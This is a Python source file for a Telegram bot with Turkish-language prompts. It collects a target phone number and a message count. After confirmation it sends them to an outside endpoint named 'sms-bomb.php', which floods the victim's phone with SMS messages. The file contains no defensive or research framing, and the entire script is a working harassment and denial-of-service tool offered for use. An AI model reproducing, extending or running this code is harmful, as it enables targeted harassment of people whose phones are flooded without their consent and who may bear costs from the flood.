import os
import requests
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
    CallbackQueryHandler,
)

TOKEN = os.getenv("BOT_TOKEN")

API_URL = "https://cvron.alwaysdata.net/cvronapi/sms-bomb.php"

logging.basicConfig(level=logging.INFO)

PHONE, COUNT, CONFIRM = range(3)


# /sms komutu
async def sms(update: Update, context: ContextTypes.DEFAULT_TYPE):

    await update.message.reply_text(
        "Telefon numarasını gir:\n"
        "Örnek: 5xxxxxxxxx"
    )

    return PHONE


# telefon al
async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):

    phone = update.message.text.strip()

    if not phone.isdigit():

        await update.message.reply_text("Geçersiz telefon. Tekrar gir:")
        return PHONE

    context.user_data["phone"] = phone

    await update.message.reply_text("SMS adedi gir (örn: 50):")

    return COUNT


# adet al
async def get_count(update: Update, context: ContextTypes.DEFAULT_TYPE):

    try:

        count = int(update.message.text)

        context.user_data["count"] = count

        keyboard = [
            [InlineKeyboardButton("Onayla", callback_data="yes")],
            [InlineKeyboardButton("İptal", callback_data="no")]
        ]

        await update.message.reply_text(
            f"Telefon: {context.user_data['phone']}\n"
            f"Adet: {count}\n\nOnaylıyor musun?",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

        return CONFIRM

    except:

        await update.message.reply_text("Geçersiz sayı. Tekrar gir:")
        return COUNT


# onay
async def confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):

    query = update.callback_query
    await query.answer()

    if query.data == "yes":

        phone = context.user_data["phone"]
        count = context.user_data["count"]

        url = f"{API_URL}?phone={phone}&count={count}"

        try:

            requests.get(url)

            await query.edit_message_text(
                "SMS gönderimi başlatıldı."
            )

        except:

            await query.edit_message_text(
                "Hata oluştu."
            )

    else:

        await query.edit_message_text("İptal edildi.")

    return ConversationHandler.END


# iptal
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):

    await update.message.reply_text("İptal edildi.")

    return ConversationHandler.END


def main():

    app = ApplicationBuilder().token(TOKEN).build()

    conv = ConversationHandler(
        entry_points=[CommandHandler("sms", sms)],
        states={
            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
            COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_count)],
            CONFIRM: [CallbackQueryHandler(confirm)]
        },
        fallbacks=[CommandHandler("cancel", cancel)]
    )

    app.add_handler(conv)

    print("Bot aktif")

    app.run_polling()


if __name__ == "__main__":
    main()
